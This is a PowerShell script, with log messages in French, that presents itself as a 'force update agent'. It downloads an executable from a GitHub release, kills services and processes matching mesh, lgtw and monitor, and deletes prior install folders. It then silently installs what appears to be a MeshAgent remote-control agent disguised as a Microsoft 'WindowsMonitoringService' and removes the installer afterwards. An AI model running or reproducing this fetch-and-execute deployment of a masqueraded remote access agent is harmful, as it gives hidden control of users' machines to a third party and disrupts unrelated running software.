# =========================
# FORCE UPDATE AGENT - FINAL
# Logs: C:\Temp\NoWin
# =========================

$BaseDir = "C:\Temp\NoWin"
$LogFile = "$BaseDir\force-update-agent.log"
$InstallerName = "WindowsMonitoringService64-Lol.exe"
$InstallerPath = "$BaseDir\$InstallerName"

$DownloadUrl = "https://github.com/LightZirconite/MeshAgent/releases/download/exe/$InstallerName"

# --- Init ---
New-Item -ItemType Directory -Path $BaseDir -Force | Out-Null

function Log {
    param($msg)
    $line = "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')  $msg"
    $line | Out-File -FilePath $LogFile -Append -Encoding UTF8
}

Log "===== SCRIPT DÉMARRÉ ====="
Log "Contexte utilisateur: $([Security.Principal.WindowsIdentity]::GetCurrent().Name)"

# --- Download ---
try {
    Log "Téléchargement: $DownloadUrl"
    Invoke-WebRequest -Uri $DownloadUrl -OutFile $InstallerPath -UseBasicParsing -ErrorAction Stop
    $size = (Get-Item $InstallerPath).Length
    Log "Téléchargement OK - Taille: $size octets"
    if ($size -lt 500000) { throw "Fichier trop petit" }
}
catch {
    Log "ERREUR téléchargement: $_"
    exit 1
}

# --- Stop services ---
$servicePatterns = @("mesh*", "lgtw*", "WindowsMonitoringService*")
foreach ($pattern in $servicePatterns) {
    Get-Service -Name $pattern -ErrorAction SilentlyContinue | ForEach-Object {
        if ($_.Status -ne "Stopped") {
            Log "Arrêt service: $($_.Name)"
            Stop-Service $_ -Force -ErrorAction SilentlyContinue
        }
    }
}

# --- Kill processes ---
Get-CimInstance Win32_Process | Where-Object {
    $_.Name -match "mesh|lgtw|monitor"
} | ForEach-Object {
    Log "Kill process: $($_.Name) PID=$($_.ProcessId)"
    Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue
}

# --- Remove old folders ---
$paths = @(
    "$env:ProgramFiles\Mesh Agent",
    "$env:ProgramFiles\MeshAgent",
    "$env:ProgramFiles\LGTW*",
    "$env:ProgramFiles\Microsoft Corporation\WindowsMonitoringService",
    "$env:ProgramFiles(x86)\Mesh Agent",
    "$env:ProgramFiles(x86)\LGTW*"
)

foreach ($path in $paths) {
    Get-Item $path -ErrorAction SilentlyContinue | ForEach-Object {
        Log "Suppression dossier: $($_.FullName)"
        Remove-Item $_.FullName -Recurse -Force -ErrorAction SilentlyContinue
    }
}

# --- Install new agent ---
try {
    Log "Lancement installation --fullinstall"
    $p = Start-Process -FilePath $InstallerPath -ArgumentList "--fullinstall" -Wait -PassThru
    Log "Installation terminée - ExitCode=$($p.ExitCode)"
}
catch {
    Log "ERREUR installation: $_"
    exit 2
}

# --- Cleanup ---
Remove-Item $InstallerPath -Force -ErrorAction SilentlyContinue
Log "Installateur supprimé"

Log "===== SCRIPT TERMINÉ ====="
